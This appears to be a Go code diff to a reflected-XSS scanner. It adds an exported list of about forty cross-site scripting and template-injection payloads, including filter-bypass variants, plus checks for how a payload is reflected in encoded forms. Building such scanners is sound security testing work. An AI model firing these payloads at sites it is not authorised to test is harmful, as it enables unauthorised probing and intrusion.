@@ -7,6 +7,7 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
+	"html"
 	"io"
 	"net/http"
 	"net/url"
@@ -109,6 +110,60 @@ func getDefaultGXSSPayloads() []string {
 		"{{7*7}}",
 		"${7*7}",
 		"<%= 7*7 %>",
+	}
+}
+
+// GetAllGXSSPayloads returns all default GXSS payloads (exported for CLI)
+func GetAllGXSSPayloads() []string {
+	return []string{
+		// Basic reflection test
+		"gxss_test",
+		// HTML context - basic
+		"<script>alert(1)</script>",
+		"<img src=x onerror=alert(1)>",
+		"<svg onload=alert(1)>",
+		"<body onload=alert(1)>",
+		"<iframe src=javascript:alert(1)>",
+		"<details open ontoggle=alert(1)>",
+		"<marquee onstart=alert(1)>",
+		"<video src=x onerror=alert(1)>",
+		"<audio src=x onerror=alert(1)>",
+		"<input autofocus onfocus=alert(1)>",
+		// Attribute context
+		"\" onerror=alert(1) ",
+		"' onerror=alert(1) ",
+		"\" onload=alert(1) ",
+		"' onload=alert(1) ",
+		"\" autofocus onfocus=alert(1) ",
+		"' autofocus onfocus=alert(1) ",
+		"\" onmouseover=alert(1) ",
+		"' onmouseover=alert(1) ",
+		// JavaScript context
+		"';alert(1);//",
+		"\";alert(1);//",
+		"'-alert(1)-'",
+		"\"-alert(1)-\"",
+		"`;alert(1);//",
+		"</script><script>alert(1)</script>",
+		// URL context
+		"javascript:alert(1)",
+		"javascript:alert(1)//",
+		"data:text/html,<script>alert(1)</script>",
+		// Template context
+		"{{7*7}}",
+		"${7*7}",
+		"<%= 7*7 %>",
+		"#{7*7}",
+		// WAF bypass variations
+		"<ScRiPt>alert(1)</ScRiPt>",
+		"<img/src=x onerror=alert(1)>",
+		"<svg/onload=alert(1)>",
+		"<img src=x onerror=alert`1`>",
+		"<svg onload=alert`1`>",
+		// Event handlers
+		" onmouseover=alert(1) ",
+		" onfocus=alert(1) autofocus ",
+		" onclick=alert(1) ",
 	}
 }
 
@@ -258,16 +313,92 @@ func (g *GXSSScanner) testPayload(ctx context.Context, targetURL, paramName, pay
 	bodyStr := string(body)
 
 	// Check if payload is reflected
+	// Payload URL encode edilmiş olabilir, decode edip kontrol et
+	decodedPayload, _ := url.QueryUnescape(payload)
+	if decodedPayload == "" {
+		decodedPayload = payload
+	}
+	
+	// URL encode edilmiş hali de olabilir
+	encodedPayload := url.QueryEscape(payload)
+	
+	// Double URL encoding
+	doubleEncodedPayload := url.QueryEscape(encodedPayload)
+	
+	// HTML entity encoded hali de olabilir
+	htmlEncodedPayload := html.EscapeString(payload)
+	
+	// Debug: Hangi payload'ı aradığımızı göster
+	if g.config.Verbose {
+		fmt.Printf("[DEBUG] Looking for payload: %q\n", payload)
+		fmt.Printf("[DEBUG] Decoded: %q\n", decodedPayload)
+		fmt.Printf("[DEBUG] Encoded: %q\n", encodedPayload)
+		fmt.Printf("[DEBUG] Double Encoded: %q\n", doubleEncodedPayload)
+		fmt.Printf("[DEBUG] HTML Encoded: %q\n", htmlEncodedPayload)
+		// Response'ta ne olduğunu göster (ilk 500 karakter)
+		if len(bodyStr) > 500 {
+			fmt.Printf("[DEBUG] Response preview: %s\n", bodyStr[:500])
+		} else {
+			fmt.Printf("[DEBUG] Response: %s\n", bodyStr)
+		}
+	}
+	
+	// Hangi formatta yansıdığını belirlemek için değişken
+	reflectedFormat := ""
+	
+	// Check if payload is reflected in response (çeşitli formatlarda)
 	if strings.Contains(bodyStr, payload) {
+		reflectedFormat = "raw"
+	} else if strings.Contains(bodyStr, decodedPayload) {
+		reflectedFormat = "decoded"
+	} else if strings.Contains(bodyStr, encodedPayload) {
+		reflectedFormat = "url-encoded"
+	} else if strings.Contains(bodyStr, htmlEncodedPayload) {
+		reflectedFormat = "html-encoded"
+	} else if strings.Contains(bodyStr, doubleEncodedPayload) {
+		reflectedFormat = "double-encoded"
+	}
+	
+	// Ek kontrol: Payload içinde özel karakterler varsa, onların encoded hallerini de kontrol et
+	if reflectedFormat == "" {
+		// HTML entity encoded karakterler için kontrol
+		if strings.Contains(payload, "<") && strings.Contains(bodyStr, "&lt;") {
+			reflectedFormat = "html-entity-partial"
+		} else if strings.Contains(payload, ">") && strings.Contains(bodyStr, "&gt;") {
+			reflectedFormat = "html-entity-partial"
+		} else if strings.Contains(payload, "\"") && strings.Contains(bodyStr, "&quot;") {
+			reflectedFormat = "html-entity-partial"
+		} else if strings.Contains(payload, "'") && (strings.Contains(bodyStr, "&#x27;") || strings.Contains(bodyStr, "&#39;")) {
+			reflectedFormat = "html-entity-partial"
+		}
+		
+		// URL encoded karakterler için kontrol
+		if reflectedFormat == "" {
+			if strings.Contains(payload, "<") && (strings.Contains(bodyStr, "%3C") || strings.Contains(bodyStr, "%3c")) {
+				reflectedFormat = "url-entity-partial"
+			} else if strings.Contains(payload, ">") && (strings.Contains(bodyStr, "%3E") || strings.Contains(bodyStr, "%3e")) {
+				reflectedFormat = "url-entity-partial"
+			} else if strings.Contains(payload, "\"") && strings.Contains(bodyStr, "%22") {
+				reflectedFormat = "url-entity-partial"
+			} else if strings.Contains(payload, "'") && strings.Contains(bodyStr, "%27") {
+				reflectedFormat = "url-entity-partial"
+			}
+		}
+	}
+	
+	isReflected := reflectedFormat != ""
+	
+	if isReflected {
 		result.Reflected = true
 		result.Evidence = extractEvidence(bodyStr, payload)
 		result.Context = g.detectContext(bodyStr, payload)
 		
-		// Dalfox-style output
-		color.Red("[VULN] %s", payload)
-		color.Red("       Param: %s", paramName)
-		color.Red("       URL: %s", testURL)
-		color.Red("       Context: %s", result.Context)
+		// Dalfox-style output with detailed information
+		color.Green("[REFLECTED] Payload: %s", payload)
+		color.Green("            Param: %s", paramName)
+		color.Green("            Format: %s", reflectedFormat)
+		color.Green("            Context: %s", result.Context)
+		color.Cyan("            URL: %s", testURL)
 		fmt.Println()
 	}
 
@@ -357,6 +488,12 @@ func PrintGXSSResults(results []GXSSResult) {
 			color.White("    Context: %s", r.Context)
 		}
 	}
+}
+
+// TestPayloadDirect tests a single payload directly and returns result
+// Bu fonksiyon CLI'dan çağrılır
+func (g *GXSSScanner) TestPayloadDirect(ctx context.Context, targetURL, paramName, payload string) GXSSResult {
+	return g.testPayload(ctx, targetURL, paramName, payload)
 }
 
 // GetGXSSVulnerablePayloads returns payloads that are likely to work based on context
